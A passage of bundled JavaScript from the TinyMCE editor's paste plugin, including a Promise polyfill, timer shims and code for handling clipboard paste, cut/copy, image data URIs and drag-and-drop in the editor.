                    if (self._state === 2 && self._deferreds.length === 0) {
                      Promise._immediateFn(function () {
                        if (!self._handled) {
                          Promise._unhandledRejectionFn(self._value);
                        }
                      });
                    }
                    for (var i = 0, len = self._deferreds.length; i < len; i++) {
                      handle(self, self._deferreds[i]);
                    }
                    self._deferreds = null;
                  }
                  function Handler(onFulfilled, onRejected, promise) {
                    this.onFulfilled = typeof onFulfilled === 'function' ? onFulfilled : null;
                    this.onRejected = typeof onRejected === 'function' ? onRejected : null;
                    this.promise = promise;
                  }
                  function doResolve(fn, self) {
                    var done = false;
                    try {
                      fn(function (value) {
                        if (done)
                          return;
                        done = true;
                        resolve(self, value);
                      }, function (reason) {
                        if (done)
                          return;
                        done = true;
                        reject(self, reason);
                      });
                    } catch (ex) {
                      if (done)
                        return;
                      done = true;
                      reject(self, ex);
                    }
                  }
                  Promise.prototype['catch'] = function (onRejected) {
                    return this.then(null, onRejected);
                  };
                  Promise.prototype.then = function (onFulfilled, onRejected) {
                    var prom = new this.constructor(noop);
                    handle(this, new Handler(onFulfilled, onRejected, prom));
                    return prom;
                  };
                  Promise.all = function (arr) {
                    var args = Array.prototype.slice.call(arr);
                    return new Promise(function (resolve, reject) {
                      if (args.length === 0)
                        return resolve([]);
                      var remaining = args.length;
                      function res(i, val) {
                        try {
                          if (val && (typeof val === 'object' || typeof val === 'function')) {
                            var then = val.then;
                            if (typeof then === 'function') {
                              then.call(val, function (val) {
                                res(i, val);
                              }, reject);
                              return;
                            }
                          }
                          args[i] = val;
                          if (--remaining === 0) {
                            resolve(args);
                          }
                        } catch (ex) {
                          reject(ex);
                        }
                      }
                      for (var i = 0; i < args.length; i++) {
                        res(i, args[i]);
                      }
                    });
                  };
                  Promise.resolve = function (value) {
                    if (value && typeof value === 'object' && value.constructor === Promise) {
                      return value;
                    }
                    return new Promise(function (resolve) {
                      resolve(value);
                    });
                  };
                  Promise.reject = function (value) {
                    return new Promise(function (resolve, reject) {
                      reject(value);
                    });
                  };
                  Promise.race = function (values) {
                    return new Promise(function (resolve, reject) {
                      for (var i = 0, len = values.length; i < len; i++) {
                        values[i].then(resolve, reject);
                      }
                    });
                  };
                  Promise._immediateFn = typeof setImmediate === 'function' ? function (fn) {
                    setImmediate(fn);
                  } : function (fn) {
                    setTimeoutFunc(fn, 0);
                  };
                  Promise._unhandledRejectionFn = function _unhandledRejectionFn(err) {
                    if (typeof console !== 'undefined' && console) {
                      console.warn('Possible Unhandled Promise Rejection:', err);
                    }
                  };
                  Promise._setImmediateFn = function _setImmediateFn(fn) {
                    Promise._immediateFn = fn;
                  };
                  Promise._setUnhandledRejectionFn = function _setUnhandledRejectionFn(fn) {
                    Promise._unhandledRejectionFn = fn;
                  };
                  if (typeof module !== 'undefined' && module.exports) {
                    module.exports = Promise;
                  } else if (!root.Promise) {
                    root.Promise = Promise;
                  }
                }(this));
              }.call(this, require('timers').setImmediate));
            },
            { 'timers': 3 }
          ],
          3: [
            function (require, module, exports) {
              (function (setImmediate, clearImmediate) {
                var nextTick = require('process/browser.js').nextTick;
                var apply = Function.prototype.apply;
                var slice = Array.prototype.slice;
                var immediateIds = {};
                var nextImmediateId = 0;
                exports.setTimeout = function () {
                  return new Timeout(apply.call(setTimeout, window, arguments), clearTimeout);
                };
                exports.setInterval = function () {
                  return new Timeout(apply.call(setInterval, window, arguments), clearInterval);
                };
                exports.clearTimeout = exports.clearInterval = function (timeout) {
                  timeout.close();
                };
                function Timeout(id, clearFn) {
                  this._id = id;
                  this._clearFn = clearFn;
                }
                Timeout.prototype.unref = Timeout.prototype.ref = function () {
                };
                Timeout.prototype.close = function () {
                  this._clearFn.call(window, this._id);
                };
                exports.enroll = function (item, msecs) {
                  clearTimeout(item._idleTimeoutId);
                  item._idleTimeout = msecs;
                };
                exports.unenroll = function (item) {
                  clearTimeout(item._idleTimeoutId);
                  item._idleTimeout = -1;
                };
                exports._unrefActive = exports.active = function (item) {
                  clearTimeout(item._idleTimeoutId);
                  var msecs = item._idleTimeout;
                  if (msecs >= 0) {
                    item._idleTimeoutId = setTimeout(function onTimeout() {
                      if (item._onTimeout)
                        item._onTimeout();
                    }, msecs);
                  }
                };
                exports.setImmediate = typeof setImmediate === 'function' ? setImmediate : function (fn) {
                  var id = nextImmediateId++;
                  var args = arguments.length < 2 ? false : slice.call(arguments, 1);
                  immediateIds[id] = true;
                  nextTick(function onNextTick() {
                    if (immediateIds[id]) {
                      if (args) {
                        fn.apply(null, args);
                      } else {
                        fn.call(null);
                      }
                      exports.clearImmediate(id);
                    }
                  });
                  return id;
                };
                exports.clearImmediate = typeof clearImmediate === 'function' ? clearImmediate : function (id) {
                  delete immediateIds[id];
                };
              }.call(this, require('timers').setImmediate, require('timers').clearImmediate));
            },
            {
              'process/browser.js': 1,
              'timers': 3
            }
          ],
          4: [
            function (require, module, exports) {
              var promisePolyfill = require('promise-polyfill');
              var Global = function () {
                if (typeof window !== 'undefined') {
                  return window;
                } else {
                  return Function('return this;')();
                }
              }();
              module.exports = { boltExport: Global.Promise || promisePolyfill };
            },
            { 'promise-polyfill': 2 }
          ]
        }, {}, [4])(4);
      }));
    }(undefined, exports$1, module, undefined));
    var Promise = module.exports.boltExport;

    var nu = function (baseFn) {
      var data = Option.none();
      var callbacks = [];
      var map = function (f) {
        return nu(function (nCallback) {
          get(function (data) {
            nCallback(f(data));
          });
        });
      };
      var get = function (nCallback) {
        if (isReady()) {
          call(nCallback);
        } else {
          callbacks.push(nCallback);
        }
      };
      var set = function (x) {
        data = Option.some(x);
        run(callbacks);
        callbacks = [];
      };
      var isReady = function () {
        return data.isSome();
      };
      var run = function (cbs) {
        each(cbs, call);
      };
      var call = function (cb) {
        data.each(function (x) {
          domGlobals.setTimeout(function () {
            cb(x);
          }, 0);
        });
      };
      baseFn(set);
      return {
        get: get,
        map: map,
        isReady: isReady
      };
    };
    var pure = function (a) {
      return nu(function (callback) {
        callback(a);
      });
    };
    var LazyValue = {
      nu: nu,
      pure: pure
    };

    var errorReporter = function (err) {
      domGlobals.setTimeout(function () {
        throw err;
      }, 0);
    };
    var make = function (run) {
      var get = function (callback) {
        run().then(callback, errorReporter);
      };
      var map = function (fab) {
        return make(function () {
          return run().then(fab);
        });
      };
      var bind = function (aFutureB) {
        return make(function () {
          return run().then(function (v) {
            return aFutureB(v).toPromise();
          });
        });
      };
      var anonBind = function (futureB) {
        return make(function () {
          return run().then(function () {
            return futureB.toPromise();
          });
        });
      };
      var toLazy = function () {
        return LazyValue.nu(get);
      };
      var toCached = function () {
        var cache = null;
        return make(function () {
          if (cache === null) {
            cache = run();
          }
          return cache;
        });
      };
      var toPromise = run;
      return {
        map: map,
        bind: bind,
        anonBind: anonBind,
        toLazy: toLazy,
        toCached: toCached,
        toPromise: toPromise,
        get: get
      };
    };
    var nu$1 = function (baseFn) {
      return make(function () {
        return new Promise(baseFn);
      });
    };
    var pure$1 = function (a) {
      return make(function () {
        return Promise.resolve(a);
      });
    };
    var Future = {
      nu: nu$1,
      pure: pure$1
    };

    var par = function (asyncValues, nu) {
      return nu(function (callback) {
        var r = [];
        var count = 0;
        var cb = function (i) {
          return function (value) {
            r[i] = value;
            count++;
            if (count >= asyncValues.length) {
              callback(r);
            }
          };
        };
        if (asyncValues.length === 0) {
          callback([]);
        } else {
          each(asyncValues, function (asyncValue, i) {
            asyncValue.get(cb(i));
          });
        }
      });
    };

    var par$1 = function (futures) {
      return par(futures, Future.nu);
    };
    var traverse = function (array, fn) {
      return par$1(map(array, fn));
    };
    var mapM = traverse;

    var value = function () {
      var subject = Cell(Option.none());
      var clear = function () {
        subject.set(Option.none());
      };
      var set = function (s) {
        subject.set(Option.some(s));
      };
      var on = function (f) {
        subject.get().each(f);
      };
      var isSet = function () {
        return subject.get().isSome();
      };
      return {
        clear: clear,
        set: set,
        isSet: isSet,
        on: on
      };
    };

    var pasteHtml$1 = function (editor, html, internalFlag) {
      var internal = internalFlag ? internalFlag : InternalHtml.isMarked(html);
      var args = ProcessFilters.process(editor, InternalHtml.unmark(html), internal);
      if (args.cancelled === false) {
        SmartPaste.insertContent(editor, args.content);
      }
    };
    var pasteText = function (editor, text) {
      text = editor.dom.encode(text).replace(/\r\n/g, '\n');
      text = Newlines.convert(text, editor.settings.forced_root_block, editor.settings.forced_root_block_attrs);
      pasteHtml$1(editor, text, false);
    };
    var getDataTransferItems = function (dataTransfer) {
      var items = {};
      var mceInternalUrlPrefix = 'data:text/mce-internal,';
      if (dataTransfer) {
        if (dataTransfer.getData) {
          var legacyText = dataTransfer.getData('Text');
          if (legacyText && legacyText.length > 0) {
            if (legacyText.indexOf(mceInternalUrlPrefix) === -1) {
              items['text/plain'] = legacyText;
            }
          }
        }
        if (dataTransfer.types) {
          for (var i = 0; i < dataTransfer.types.length; i++) {
            var contentType = dataTransfer.types[i];
            try {
              items[contentType] = dataTransfer.getData(contentType);
            } catch (ex) {
              items[contentType] = '';
            }
          }
        }
      }
      return items;
    };
    var getClipboardContent = function (editor, clipboardEvent) {
      var content = getDataTransferItems(clipboardEvent.clipboardData || editor.getDoc().dataTransfer);
      return Utils.isMsEdge() ? global$4.extend(content, { 'text/html': '' }) : content;
    };
    var hasContentType = function (clipboardContent, mimeType) {
      return mimeType in clipboardContent && clipboardContent[mimeType].length > 0;
    };
    var hasHtmlOrText = function (content) {
      return hasContentType(content, 'text/html') || hasContentType(content, 'text/plain');
    };
    var getBase64FromUri = function (uri) {
      var idx;
      idx = uri.indexOf(',');
      if (idx !== -1) {
        return uri.substr(idx + 1);
      }
      return null;
    };
    var isValidDataUriImage = function (settings, imgElm) {
      return settings.images_dataimg_filter ? settings.images_dataimg_filter(imgElm) : true;
    };
    var extractFilename = function (editor, str) {
      var m = str.match(/([\s\S]+?)\.(?:jpeg|jpg|png|gif)$/i);
      return m ? editor.dom.encode(m[1]) : null;
    };
    var uniqueId = Utils.createIdGenerator('mceclip');
    var pasteImage = function (editor, imageItem) {
      var base64 = getBase64FromUri(imageItem.uri);
      var id = uniqueId();
      var name = editor.settings.images_reuse_filename && imageItem.blob.name ? extractFilename(editor, imageItem.blob.name) : id;
      var img = new domGlobals.Image();
      img.src = imageItem.uri;
      if (isValidDataUriImage(editor.settings, img)) {
        var blobCache = editor.editorUpload.blobCache;
        var blobInfo = void 0, existingBlobInfo = void 0;
        existingBlobInfo = blobCache.findFirst(function (cachedBlobInfo) {
          return cachedBlobInfo.base64() === base64;
        });
        if (!existingBlobInfo) {
          blobInfo = blobCache.create(id, imageItem.blob, base64, name);
          blobCache.add(blobInfo);
        } else {
          blobInfo = existingBlobInfo;
        }
        pasteHtml$1(editor, '<img src="' + blobInfo.blobUri() + '">', false);
      } else {
        pasteHtml$1(editor, '<img src="' + imageItem.uri + '">', false);
      }
    };
    var isClipboardEvent = function (event) {
      return event.type === 'paste';
    };
    var readBlobsAsDataUris = function (items) {
      return mapM(items, function (item) {
        return Future.nu(function (resolve) {
          var blob = item.getAsFile ? item.getAsFile() : item;
          var reader = new window.FileReader();
          reader.onload = function () {
            resolve({
              blob: blob,
              uri: reader.result
            });
          };
          reader.readAsDataURL(blob);
        });
      });
    };
    var getImagesFromDataTransfer = function (dataTransfer) {
      var items = dataTransfer.items ? map(from$1(dataTransfer.items), function (item) {
        return item.getAsFile();
      }) : [];
      var files = dataTransfer.files ? from$1(dataTransfer.files) : [];
      var images = filter$1(items.length > 0 ? items : files, function (file) {
        return /^image\/(jpeg|png|gif|bmp)$/.test(file.type);
      });
      return images;
    };
    var pasteImageData = function (editor, e, rng) {
      var dataTransfer = isClipboardEvent(e) ? e.clipboardData : e.dataTransfer;
      if (editor.settings.paste_data_images && dataTransfer) {
        var images = getImagesFromDataTransfer(dataTransfer);
        if (images.length > 0) {
          e.preventDefault();
          readBlobsAsDataUris(images).get(function (blobResults) {
            if (rng) {
              editor.selection.setRng(rng);
            }
            each(blobResults, function (result) {
              pasteImage(editor, result);
            });
          });
          return true;
        }
      }
      return false;
    };
    var isBrokenAndroidClipboardEvent = function (e) {
      var clipboardData = e.clipboardData;
      return domGlobals.navigator.userAgent.indexOf('Android') !== -1 && clipboardData && clipboardData.items && clipboardData.items.length === 0;
    };
    var isKeyboardPasteEvent = function (e) {
      return global$5.metaKeyPressed(e) && e.keyCode === 86 || e.shiftKey && e.keyCode === 45;
    };
    var registerEventHandlers = function (editor, pasteBin, pasteFormat) {
      var keyboardPasteEvent = value();
      var keyboardPastePlainTextState;
      editor.on('keydown', function (e) {
        function removePasteBinOnKeyUp(e) {
          if (isKeyboardPasteEvent(e) && !e.isDefaultPrevented()) {
            pasteBin.remove();
          }
        }
        if (isKeyboardPasteEvent(e) && !e.isDefaultPrevented()) {
          keyboardPastePlainTextState = e.shiftKey && e.keyCode === 86;
          if (keyboardPastePlainTextState && global$2.webkit && domGlobals.navigator.userAgent.indexOf('Version/') !== -1) {
            return;
          }
          e.stopImmediatePropagation();
          keyboardPasteEvent.set(e);
          window.setTimeout(function () {
            keyboardPasteEvent.clear();
          }, 100);
          if (global$2.ie && keyboardPastePlainTextState) {
            e.preventDefault();
            Events.firePaste(editor, true);
            return;
          }
          pasteBin.remove();
          pasteBin.create();
          editor.once('keyup', removePasteBinOnKeyUp);
          editor.once('paste', function () {
            editor.off('keyup', removePasteBinOnKeyUp);
          });
        }
      });
      function insertClipboardContent(clipboardContent, isKeyBoardPaste, plainTextMode, internal) {
        var content, isPlainTextHtml;
        if (hasContentType(clipboardContent, 'text/html')) {
          content = clipboardContent['text/html'];
        } else {
          content = pasteBin.getHtml();
          internal = internal ? internal : InternalHtml.isMarked(content);
          if (pasteBin.isDefaultContent(content)) {
            plainTextMode = true;
          }
        }
        content = Utils.trimHtml(content);
        pasteBin.remove();
        isPlainTextHtml = internal === false && Newlines.isPlainText(content);
        if (!content.length || isPlainTextHtml) {
          plainTextMode = true;
        }
        if (plainTextMode) {
          if (hasContentType(clipboardContent, 'text/plain') && isPlainTextHtml) {
            content = clipboardContent['text/plain'];
          } else {
            content = Utils.innerText(content);
          }
        }
        if (pasteBin.isDefaultContent(content)) {
          if (!isKeyBoardPaste) {
            editor.windowManager.alert('Please use Ctrl+V/Cmd+V keyboard shortcuts to paste contents.');
          }
          return;
        }
        if (plainTextMode) {
          pasteText(editor, content);
        } else {
          pasteHtml$1(editor, content, internal);
        }
      }
      var getLastRng = function () {
        return pasteBin.getLastRng() || editor.selection.getRng();
      };
      editor.on('paste', function (e) {
        var isKeyBoardPaste = keyboardPasteEvent.isSet();
        var clipboardContent = getClipboardContent(editor, e);
        var plainTextMode = pasteFormat.get() === 'text' || keyboardPastePlainTextState;
        var internal = hasContentType(clipboardContent, InternalHtml.internalHtmlMime());
        keyboardPastePlainTextState = false;
        if (e.isDefaultPrevented() || isBrokenAndroidClipboardEvent(e)) {
          pasteBin.remove();
          return;
        }
        if (!hasHtmlOrText(clipboardContent) && pasteImageData(editor, e, getLastRng())) {
          pasteBin.remove();
          return;
        }
        if (!isKeyBoardPaste) {
          e.preventDefault();
        }
        if (global$2.ie && (!isKeyBoardPaste || e.ieFake) && !hasContentType(clipboardContent, 'text/html')) {
          pasteBin.create();
          editor.dom.bind(pasteBin.getEl(), 'paste', function (e) {
            e.stopPropagation();
          });
          editor.getDoc().execCommand('Paste', false, null);
          clipboardContent['text/html'] = pasteBin.getHtml();
        }
        if (hasContentType(clipboardContent, 'text/html')) {
          e.preventDefault();
          if (!internal) {
            internal = InternalHtml.isMarked(clipboardContent['text/html']);
          }
          insertClipboardContent(clipboardContent, isKeyBoardPaste, plainTextMode, internal);
        } else {
          global$3.setEditorTimeout(editor, function () {
            insertClipboardContent(clipboardContent, isKeyBoardPaste, plainTextMode, internal);
          }, 0);
        }
      });
    };
    var registerEventsAndFilters = function (editor, pasteBin, pasteFormat) {
      registerEventHandlers(editor, pasteBin, pasteFormat);
      var src;
      editor.parser.addNodeFilter('img', function (nodes, name, args) {
        var isPasteInsert = function (args) {
          return args.data && args.data.paste === true;
        };
        var remove = function (node) {
          if (!node.attr('data-mce-object') && src !== global$2.transparentSrc) {
            node.remove();
          }
        };
        var isWebKitFakeUrl = function (src) {
          return src.indexOf('webkit-fake-url') === 0;
        };
        var isDataUri = function (src) {
          return src.indexOf('data:') === 0;
        };
        if (!editor.settings.paste_data_images && isPasteInsert(args)) {
          var i = nodes.length;
          while (i--) {
            src = nodes[i].attributes.map.src;
            if (!src) {
              continue;
            }
            if (isWebKitFakeUrl(src)) {
              remove(nodes[i]);
            } else if (!editor.settings.allow_html_data_urls && isDataUri(src)) {
              remove(nodes[i]);
            }
          }
        }
      });
    };

    var getPasteBinParent = function (editor) {
      return global$2.ie && editor.inline ? domGlobals.document.body : editor.getBody();
    };
    var isExternalPasteBin = function (editor) {
      return getPasteBinParent(editor) !== editor.getBody();
    };
    var delegatePasteEvents = function (editor, pasteBinElm, pasteBinDefaultContent) {
      if (isExternalPasteBin(editor)) {
        editor.dom.bind(pasteBinElm, 'paste keyup', function (e) {
          if (!isDefault(editor, pasteBinDefaultContent)) {
            editor.fire('paste');
          }
        });
      }
    };
    var create = function (editor, lastRngCell, pasteBinDefaultContent) {
      var dom = editor.dom, body = editor.getBody();
      var pasteBinElm;
      lastRngCell.set(editor.selection.getRng());
      pasteBinElm = editor.dom.add(getPasteBinParent(editor), 'div', {
        'id': 'mcepastebin',
        'class': 'mce-pastebin',
        'contentEditable': true,
        'data-mce-bogus': 'all',
        'style': 'position: fixed; top: 50%; width: 10px; height: 10px; overflow: hidden; opacity: 0'
      }, pasteBinDefaultContent);
      if (global$2.ie || global$2.gecko) {
        dom.setStyle(pasteBinElm, 'left', dom.getStyle(body, 'direction', true) === 'rtl' ? 65535 : -65535);
      }
      dom.bind(pasteBinElm, 'beforedeactivate focusin focusout', function (e) {
        e.stopPropagation();
      });
      delegatePasteEvents(editor, pasteBinElm, pasteBinDefaultContent);
      pasteBinElm.focus();
      editor.selection.select(pasteBinElm, true);
    };
    var remove = function (editor, lastRngCell) {
      if (getEl(editor)) {
        var pasteBinClone = void 0;
        var lastRng = lastRngCell.get();
        while (pasteBinClone = editor.dom.get('mcepastebin')) {
          editor.dom.remove(pasteBinClone);
          editor.dom.unbind(pasteBinClone);
        }
        if (lastRng) {
          editor.selection.setRng(lastRng);
        }
      }
      lastRngCell.set(null);
    };
    var getEl = function (editor) {
      return editor.dom.get('mcepastebin');
    };
    var getHtml = function (editor) {
      var pasteBinElm, pasteBinClones, i, dirtyWrappers, cleanWrapper;
      var copyAndRemove = function (toElm, fromElm) {
        toElm.appendChild(fromElm);
        editor.dom.remove(fromElm, true);
      };
      pasteBinClones = global$4.grep(getPasteBinParent(editor).childNodes, function (elm) {
        return elm.id === 'mcepastebin';
      });
      pasteBinElm = pasteBinClones.shift();
      global$4.each(pasteBinClones, function (pasteBinClone) {
        copyAndRemove(pasteBinElm, pasteBinClone);
      });
      dirtyWrappers = editor.dom.select('div[id=mcepastebin]', pasteBinElm);
      for (i = dirtyWrappers.length - 1; i >= 0; i--) {
        cleanWrapper = editor.dom.create('div');
        pasteBinElm.insertBefore(cleanWrapper, dirtyWrappers[i]);
        copyAndRemove(cleanWrapper, dirtyWrappers[i]);
      }
      return pasteBinElm ? pasteBinElm.innerHTML : '';
    };
    var getLastRng = function (lastRng) {
      return lastRng.get();
    };
    var isDefaultContent = function (pasteBinDefaultContent, content) {
      return content === pasteBinDefaultContent;
    };
    var isPasteBin = function (elm) {
      return elm && elm.id === 'mcepastebin';
    };
    var isDefault = function (editor, pasteBinDefaultContent) {
      var pasteBinElm = getEl(editor);
      return isPasteBin(pasteBinElm) && isDefaultContent(pasteBinDefaultContent, pasteBinElm.innerHTML);
    };
    var PasteBin = function (editor) {
      var lastRng = Cell(null);
      var pasteBinDefaultContent = '%MCEPASTEBIN%';
      return {
        create: function () {
          return create(editor, lastRng, pasteBinDefaultContent);
        },
        remove: function () {
          return remove(editor, lastRng);
        },
        getEl: function () {
          return getEl(editor);
        },
        getHtml: function () {
          return getHtml(editor);
        },
        getLastRng: function () {
          return getLastRng(lastRng);
        },
        isDefault: function () {
          return isDefault(editor, pasteBinDefaultContent);
        },
        isDefaultContent: function (content) {
          return isDefaultContent(pasteBinDefaultContent, content);
        }
      };
    };

    var Clipboard = function (editor, pasteFormat) {
      var pasteBin = PasteBin(editor);
      editor.on('preInit', function () {
        return registerEventsAndFilters(editor, pasteBin, pasteFormat);
      });
      return {
        pasteFormat: pasteFormat,
        pasteHtml: function (html, internalFlag) {
          return pasteHtml$1(editor, html, internalFlag);
        },
        pasteText: function (text) {
          return pasteText(editor, text);
        },
        pasteImageData: function (e, rng) {
          return pasteImageData(editor, e, rng);
        },
        getDataTransferItems: getDataTransferItems,
        hasHtmlOrText: hasHtmlOrText,
        hasContentType: hasContentType
      };
    };

    var noop$1 = function () {
    };
    var hasWorkingClipboardApi = function (clipboardData) {
      return global$2.iOS === false && clipboardData !== undefined && typeof clipboardData.setData === 'function' && Utils.isMsEdge() !== true;
    };
    var setHtml5Clipboard = function (clipboardData, html, text) {
      if (hasWorkingClipboardApi(clipboardData)) {
        try {
          clipboardData.clearData();
          clipboardData.setData('text/html', html);
          clipboardData.setData('text/plain', text);
          clipboardData.setData(InternalHtml.internalHtmlMime(), html);
          return true;
        } catch (e) {
          return false;
        }
      } else {
        return false;
      }
    };
    var setClipboardData = function (evt, data, fallback, done) {
      if (setHtml5Clipboard(evt.clipboardData, data.html, data.text)) {
        evt.preventDefault();
        done();
      } else {
        fallback(data.html, done);
      }
    };
    var fallback = function (editor) {
      return function (html, done) {
        var markedHtml = InternalHtml.mark(html);
        var outer = editor.dom.create('div', {
          'contenteditable': 'false',
          'data-mce-bogus': 'all'
        });
        var inner = editor.dom.create('div', { contenteditable: 'true' }, markedHtml);
        editor.dom.setStyles(outer, {
          position: 'fixed',
          top: '0',
          left: '-3000px',
          width: '1000px',
          overflow: 'hidden'
        });
        outer.appendChild(inner);
        editor.dom.add(editor.getBody(), outer);
        var range = editor.selection.getRng();
        inner.focus();
        var offscreenRange = editor.dom.createRng();
        offscreenRange.selectNodeContents(inner);
        editor.selection.setRng(offscreenRange);
        setTimeout(function () {
          editor.selection.setRng(range);
          outer.parentNode.removeChild(outer);
          done();
        }, 0);
      };
    };
    var getData = function (editor) {
      return {
        html: editor.selection.getContent({ contextual: true }),
        text: editor.selection.getContent({ format: 'text' })
      };
    };
    var isTableSelection = function (editor) {
      return !!editor.dom.getParent(editor.selection.getStart(), 'td[data-mce-selected],th[data-mce-selected]', editor.getBody());
    };
    var hasSelectedContent = function (editor) {
      return !editor.selection.isCollapsed() || isTableSelection(editor);
    };
    var cut = function (editor) {
      return function (evt) {
        if (hasSelectedContent(editor)) {
          setClipboardData(evt, getData(editor), fallback(editor), function () {
            setTimeout(function () {
              editor.execCommand('Delete');
            }, 0);
          });
        }
      };
    };
    var copy = function (editor) {
      return function (evt) {
        if (hasSelectedContent(editor)) {
          setClipboardData(evt, getData(editor), fallback(editor), noop$1);
        }
      };
    };
    var register$1 = function (editor) {
      editor.on('cut', cut(editor));
      editor.on('copy', copy(editor));
    };
    var CutCopy = { register: register$1 };

    var global$b = tinymce.util.Tools.resolve('tinymce.dom.RangeUtils');

    var getCaretRangeFromEvent = function (editor, e) {
      return global$b.getCaretRangeFromPoint(e.clientX, e.clientY, editor.getDoc());
    };
    var isPlainTextFileUrl = function (content) {
      var plainTextContent = content['text/plain'];
      return plainTextContent ? plainTextContent.indexOf('file://') === 0 : false;
    };
    var setFocusedRange = function (editor, rng) {
      editor.focus();
      editor.selection.setRng(rng);
    };
    var setup = function (editor, clipboard, draggingInternallyState) {
      if (Settings.shouldBlockDrop(editor)) {
        editor.on('dragend dragover draggesture dragdrop drop drag', function (e) {
          e.preventDefault();
          e.stopPropagation();
        });
      }
      if (!Settings.shouldPasteDataImages(editor)) {
        editor.on('drop', function (e) {
          var dataTransfer = e.dataTransfer;
          if (dataTransfer && dataTransfer.files && dataTransfer.files.length > 0) {
            e.preventDefault();
          }
        });
      }
      editor.on('drop', function (e) {
        var dropContent, rng;
        rng = getCaretRangeFromEvent(editor, e);
        if (e.isDefaultPrevented() || draggingInternallyState.get()) {
          return;
        }
        dropContent = clipboard.getDataTransferItems(e.dataTransfer);
        var internal = clipboard.hasContentType(dropContent, InternalHtml.internalHtmlMime());
        if ((!clipboard.hasHtmlOrText(dropContent) || isPlainTextFileUrl(dropContent)) && clipboard.pasteImageData(e, rng)) {
          return;
        }
        if (rng && Settings.shouldFilterDrop(editor)) {
          var content_1 = dropContent['mce-internal'] || dropContent['text/html'] || dropContent['text/plain'];
          if (content_1) {
            e.preventDefault();
            global$3.setEditorTimeout(editor, function () {
              editor.undoManager.transact(function () {
                if (dropContent['mce-internal']) {
                  editor.execCommand('Delete');
                }
                setFocusedRange(editor, rng);
                content_1 = Utils.trimHtml(content_1);
                if (!dropContent['text/html']) {
                  clipboard.pasteText(content_1);
                } else {
                  clipboard.pasteHtml(content_1, internal);
                }
              });
            });
          }
        }
      });
      editor.on('dragstart', function (e) {
        draggingInternallyState.set(true);
      });
      editor.on('dragover dragend', function (e) {
        if (Settings.shouldPasteDataImages(editor) && draggingInternallyState.get() === false) {
          e.preventDefault();
          setFocusedRange(editor, getCaretRangeFromEvent(editor, e));
        }
        if (e.type === 'dragend') {
          draggingInternallyState.set(false);
        }
      });
    };
    var DragDrop = { setup: setup };

    var setup$1 = function (editor) {
      var plugin = editor.plugins.paste;
      var preProcess = Settings.getPreProcess(editor);
      if (preProcess) {
        editor.on('PastePreProcess', function (e) {
          preProcess.call(plugin, plugin, e);
        });
      }
      var postProcess = Settings.getPostProcess(editor);
      if (postProcess) {
        editor.on('PastePostProcess', function (e) {
          postProcess.call(plugin, plugin, e);
        });
      }
    };
    var PrePostProcess = { setup: setup$1 };

    function addPreProcessFilter(editor, filterFunc) {
      editor.on('PastePreProcess', function (e) {
        e.content = filterFunc(editor, e.content, e.internal, e.wordContent);
      });
    }
    function addPostProcessFilter(editor, filterFunc) {
      editor.on('PastePostProcess', function (e) {
        filterFunc(editor, e.node);
      });
    }
    function removeExplorerBrElementsAfterBlocks(editor, html) {
      if (!WordFilter.isWordContent(html)) {
        return html;
      }
      var blockElements = [];
      global$4.each(editor.schema.getBlockElements(), function (block, blockName) {
        blockElements.push(blockName);
      });
      var explorerBlocksRegExp = new RegExp('(?:<br>&nbsp;[\\s\\r\\n]+|<br>)*(<\\/?(' + blockElements.join('|') + ')[^>]*>)(?:<br>&nbsp;[\\s\\r\\n]+|<br>)*', 'g');
      html = Utils.filter(html, [[
          explorerBlocksRegExp,
          '$1'
        ]]);
      html = Utils.filter(html, [
        [
          /<br><br>/g,
          '<BR><BR>'
        ],
        [
          /<br>/g,
          ' '
        ],
        [
          /<BR><BR>/g,
          '<br>'
        ]
      ]);
      return html;
    }
    function removeWebKitStyles(editor, content, internal, isWordHtml) {
      if (isWordHtml || internal) {
        return content;
      }
      var webKitStylesSetting = Settings.getWebkitStyles(editor);
      var webKitStyles;
      if (Settings.shouldRemoveWebKitStyles(editor) === false || webKitStylesSetting === 'all') {
        return content;
      }
      if (webKitStylesSetting) {
        webKitStyles = webKitStylesSetting.split(/[, ]/);
      }
      if (webKitStyles) {
        var dom_1 = editor.dom, node_1 = editor.selection.getNode();
        content = content.replace(/(<[^>]+) style="([^"]*)"([^>]*>)/gi, function (all, before, value, after) {
          var inputStyles = dom_1.parseStyle(dom_1.decode(value));
          var outputStyles = {};
          if (webKitStyles === 'none') {
            return before + after;
          }
          for (var i = 0; i < webKitStyles.length; i++) {
            var inputValue = inputStyles[webKitStyles[i]], currentValue = dom_1.getStyle(node_1, webKitStyles[i], true);
            if (/color/.test(webKitStyles[i])) {
              inputValue = dom_1.toHex(inputValue);
              currentValue = dom_1.toHex(currentValue);
            }
            if (currentValue !== inputValue) {
              outputStyles[webKitStyles[i]] = inputValue;
            }
          }
          outputStyles = dom_1.serializeStyle(outputStyles, 'span');
          if (outputStyles) {
            return before + ' style="' + outputStyles + '"' + after;
          }
          return before + after;
        });
      } else {
        content = content.replace(/(<[^>]+) style="([^"]*)"([^>]*>)/gi, '$1$3');
      }
      content = content.replace(/(<[^>]+) data-mce-style="([^"]+)"([^>]*>)/gi, function (all, before, value, after) {
        return before + ' style="' + value + '"' + after;
      });
      return content;
    }
    function removeUnderlineAndFontInAnchor(editor, root) {
      editor.$('a', root).find('font,u').each(function (i, node) {
        editor.dom.remove(node, true);
      });
    }
    var setup$2 = function (editor) {
      if (global$2.webkit) {
        addPreProcessFilter(editor, removeWebKitStyles);
      }
      if (global$2.ie) {
        addPreProcessFilter(editor, removeExplorerBrElementsAfterBlocks);
        addPostProcessFilter(editor, removeUnderlineAndFontInAnchor);
      }
    };
    var Quirks = { setup: setup$2 };

    var stateChange = function (editor, clipboard, e) {
      var ctrl = e.control;
      ctrl.active(clipboard.pasteFormat.get() === 'text');
      editor.on('PastePlainTextToggle', function (e) {
        ctrl.active(e.state);
      });
    };
    var register$2 = function (editor, clipboard) {
      var postRender = curry(stateChange, editor, clipboard);
      editor.addButton('pastetext', {
        active: false,
        icon: 'pastetext',
        tooltip: 'Paste as text',
        cmd: 'mceTogglePlainTextPaste',
        onPostRender: postRender
      });
      editor.addMenuItem('pastetext', {
        text: 'Paste as text',
        selectable: true,
        active: clipboard.pasteFormat,
        cmd: 'mceTogglePlainTextPaste',
        onPostRender: postRender
      });
    };
    var Buttons = { register: register$2 };

    global$1.add('paste', function (editor) {
      if (DetectProPlugin.hasProPlugin(editor) === false) {
        var userIsInformedState = Cell(false);
        var draggingInternallyState = Cell(false);
        var pasteFormat = Cell(Settings.isPasteAsTextEnabled(editor) ? 'text' : 'html');
        var clipboard = Clipboard(editor, pasteFormat);
